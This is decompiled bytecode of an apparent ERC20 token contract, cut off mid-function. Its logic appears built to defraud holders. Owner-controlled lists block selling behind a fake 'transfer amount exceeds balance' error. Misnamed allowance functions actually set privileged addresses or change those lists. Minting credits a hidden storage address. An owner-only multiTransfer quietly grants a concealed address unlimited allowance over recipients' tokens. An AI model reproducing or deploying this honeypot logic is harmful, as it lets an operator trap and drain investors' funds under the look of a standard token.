contract main {




// =====================  Runtime code  =====================


mapping of uint256 balanceOf;
mapping of uint8 stor1;
mapping of uint8 stor2;
uint256 stor3;
mapping of uint256 allowance;
uint256 totalSupply;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address _owner;
address stor11;
address stor12;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function _owner() payable {
    return _owner
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function decreaseAllowance(address arg1) payable {
    require calldata.size - 4 >= 32
    if _owner != msg.sender:
        revert with 0, '!owner'
    stor11 = arg1
}

function _mint(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if totalSupply + arg2 < totalSupply:
        revert with 0, 'SafeMath: addition overflow'
    totalSupply += arg2
    if balanceOf[stor10] + arg2 < balanceOf[stor10]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[stor10] += arg2
    emit Transfer(arg2, 0, arg1);
}

function addApprove(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor2[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 1
        stor1[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function increaseAllowance(address[] arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 <= 4294967296
    require arg1 + 36 <= calldata.size
    require arg1.length <= 4294967296 and arg1 + (32 * arg1.length) + 36 <= calldata.size
    mem[128 len 32 * arg1.length] = call.data[arg1 + 36 len 32 * arg1.length]
    mem[(32 * arg1.length) + 128] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg1.length:
        require idx < arg1.length
        stor1[mem[(32 * idx) + 140 len 20]] = 1
        require idx < arg1.length
        mem[0] = mem[(32 * idx) + 140 len 20]
        mem[32] = 2
        stor2[mem[(32 * idx) + 140 len 20]] = 0
        idx = idx + 1
        continue 
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if _owner != stor11:
        if msg.sender == _owner:
            if msg.sender == arg1:
                stor3 = arg2
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    else:
        if msg.sender == _owner:
            stor11 = arg1
        else:
            if msg.sender == stor11:
                if msg.sender == _owner:
                    if msg.sender == arg1:
                        stor3 = arg2
            else:
                if arg1 == _owner:
                    if msg.sender == _owner:
                        if msg.sender == arg1:
                            stor3 = arg2
                else:
                    if bool(stor1[address(msg.sender)]) != 1:
                        if bool(stor2[address(msg.sender)]) == 1:
                            if stor11 != msg.sender:
                                if arg1 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg2 >= stor3:
                                if stor11 != msg.sender:
                                    if arg1 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg1 == stor11:
                                    stor2[address(msg.sender)] = 1
                                    stor1[address(msg.sender)] = 0
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if _owner != stor11:
        if arg1 == _owner:
            if arg1 == arg2:
                stor3 = arg3
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    else:
        if arg1 == _owner:
            stor11 = arg2
        else:
            if arg1 == stor11:
                if arg1 == _owner:
                    if arg1 == arg2:
                        stor3 = arg3
            else:
                if arg2 == _owner:
                    if arg1 == _owner:
                        if arg1 == arg2:
                            stor3 = arg3
                else:
                    if bool(stor1[address(arg1)]) != 1:
                        if bool(stor2[address(arg1)]) == 1:
                            if arg1 != stor11:
                                if arg2 != stor12:
                                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                32,
                                                38,
                                                0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                mem[202 len 26]
                        else:
                            if arg3 >= stor3:
                                if arg1 != stor11:
                                    if arg2 != stor12:
                                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                                    32,
                                                    38,
                                                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                                    mem[202 len 26]
                            else:
                                if arg2 == stor11:
                                    stor2[address(arg1)] = 1
                                    stor1[address(arg1)] = 0
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x6545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function multiTransfer(uint256 arg1, address[] arg2, uint256[] arg3) payable {
    require calldata.size - 4 >= 96
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    mem[96] = arg2.length
    mem[128 len 32 * arg2.length] = call.data[arg2 + 36 len 32 * arg2.length]
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    mem[64] = (32 * arg2.length) + (32 * arg3.length) + 160
    mem[(32 * arg2.length) + 128] = arg3.length
    mem[(32 * arg2.length) + 160 len 32 * arg3.length] = call.data[arg3 + 36 len 32 * arg3.length]
    mem[(32 * arg2.length) + (32 * arg3.length) + 160] = 0
    if _owner != msg.sender:
        revert with 0, '!owner'
    idx = 0
    while idx < arg2.length:
        require idx < mem[96]
        _985 = mem[(32 * idx) + 128]
        require idx < mem[(32 * arg2.length) + 128]
        _987 = mem[(32 * idx) + (32 * arg2.length) + 160]
        if _owner != stor11:
            if msg.sender == _owner:
                if mem[(32 * idx) + 140 len 20] != msg.sender:
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1046 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1046] = 38
                    mem[_1046 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _987 > balanceOf[address(msg.sender)]:
                        _1118 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_1118 + idx + 68] = mem[_1046 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_1118 + 100] = mem[_1118 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1118 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _987
                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_985)
                    mem[32] = 0
                    balanceOf[address(_985)] += _987
                    mem[mem[64]] = _987
                    emit Transfer(_987, msg.sender, address(_985));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1610 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1610), stor12);
                else:
                    stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                    if not msg.sender:
                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                    _1078 = mem[64]
                    mem[64] = mem[64] + 96
                    mem[_1078] = 38
                    mem[_1078 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                    mem[32] = 0
                    if _987 > balanceOf[address(msg.sender)]:
                        _1159 = mem[64]
                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                        mem[mem[64] + 4] = 32
                        mem[mem[64] + 36] = 38
                        idx = 0
                        while idx < 38:
                            mem[_1159 + idx + 68] = mem[_1078 + idx + 32]
                            idx = idx + 32
                            continue 
                        mem[_1159 + 100] = mem[_1159 + 126 len 6]
                        revert with memory
                          from mem[64]
                           len _1159 + -mem[64] + 132
                    balanceOf[address(msg.sender)] -= _987
                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                        revert with 0, 'SafeMath: addition overflow'
                    mem[0] = address(_985)
                    mem[32] = 0
                    balanceOf[address(_985)] += _987
                    mem[mem[64]] = _987
                    emit Transfer(_987, msg.sender, address(_985));
                    if idx < arg1:
                        require idx < mem[96]
                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                        require idx < mem[96]
                        _1632 = mem[(32 * idx) + 128]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                        if not stor12:
                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                        mem[0] = stor12
                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                        mem[mem[64]] = -1
                        emit Approval(-1, address(_1632), stor12);
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1048 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1048] = 38
                        mem[_1048 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _987 > balanceOf[address(msg.sender)]:
                            _1121 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_1121 + idx + 68] = mem[_1048 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_1121 + 100] = mem[_1121 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1121 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _987
                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_985)
                        mem[32] = 0
                        balanceOf[address(_985)] += _987
                        mem[mem[64]] = _987
                        emit Transfer(_987, msg.sender, address(_985));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1614 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1614), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1080 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1080] = 38
                            mem[_1080 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1164 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1164 + idx + 68] = mem[_1080 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1164 + 100] = mem[_1164 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1164 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1633 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1633), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1124 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1124] = 38
                            mem[_1124 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1204 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1204 + idx + 68] = mem[_1124 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1204 + 100] = mem[_1204 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1204 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1659 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1659), stor12);
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1094 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1094] = 38
                            mem[_1094 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1175 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1175 + idx + 68] = mem[_1094 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1175 + 100] = mem[_1175 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1175 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1638 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1638), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1137 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1137] = 38
                                mem[_1137 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1216 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1216 + idx + 68] = mem[_1137 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1216 + 100] = mem[_1216 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1216 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1660 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1660), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1178 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1178] = 38
                                mem[_1178 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _987 > balanceOf[address(msg.sender)]:
                                    _1264 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1264 + idx + 68] = mem[_1178 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1264 + 100] = mem[_1264 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1264 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _987
                                if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_985)
                                mem[32] = 0
                                balanceOf[address(_985)] += _987
                                mem[mem[64]] = _987
                                emit Transfer(_987, msg.sender, address(_985));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1695 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1695), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1058 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1058] = 38
                            mem[_1058 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1134 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1134 + idx + 68] = mem[_1058 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1134 + 100] = mem[_1134 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1134 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
